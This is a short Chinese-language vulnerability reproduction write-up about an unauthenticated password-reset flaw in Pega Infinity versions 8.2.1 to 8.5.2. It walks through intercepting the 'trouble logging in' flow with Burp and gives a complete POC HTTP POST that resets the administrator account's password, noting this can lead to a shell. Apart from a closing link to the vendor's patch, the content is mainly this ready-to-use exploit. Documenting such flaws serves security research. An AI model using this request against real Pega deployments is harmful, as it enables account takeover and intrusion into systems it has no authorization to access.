## 1、 简介

PEGA infinity是美国PEGA公司的一个应用软件。提供从数字混乱过渡到真正的数字转换。

## 2、 漏洞描述

该漏洞允许攻击者可以直接重置任意账号的密码，从而配合系统内部中的功能达到getshell的目的。

## 3、 影响范围

Pega Infinity> = 8.2.1 Pega Infinity <= 8.5.2

## 4、 复现

访问<http://192.168.2.193/>会自动跳转至登录界面。

![1621245144_60a23cd801acc3532f9d0.png!small?1621245143299](https://image.3001.net/images/20210517/1621245144_60a23cd801acc3532f9d0.png!small?1621245143299)

点击trouble logging in,后在输入账号administrator@pega.com,然后用burp进行抓包。

抓包后将poc复制进去，并进行更改，发送后即可重置administrator@pega.com

密码。

![1621245160_60a23ce8a15e62bbc0d43.png!small?1621245160054](https://image.3001.net/images/20210517/1621245160_60a23ce8a15e62bbc0d43.png!small?1621245160054)

Poc：

    
    
    POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1
    
    Host: redacted.com
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 112
    
    Origin: https://redacted.com
    
    DNT: 1
    
    Connection: close
    
    Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
    
    Cookie: yourCookie
    
    Upgrade-Insecure-Requests: 1
    
    
    pzAuth=guest&NewPassword=Linlu123&ConfPassword=Linlu123&pyActivity%3DCode-Security.pzChangeUserPassword=

账号密码：[administrator@pega.com/linlu123](mailto:administrator@pega.com/linlu123)

## 5、 漏洞防御

官方已公布最新补丁

https://collaborate.pega.com/discussion/pega-security-advisory-a21-hotfix-matrix

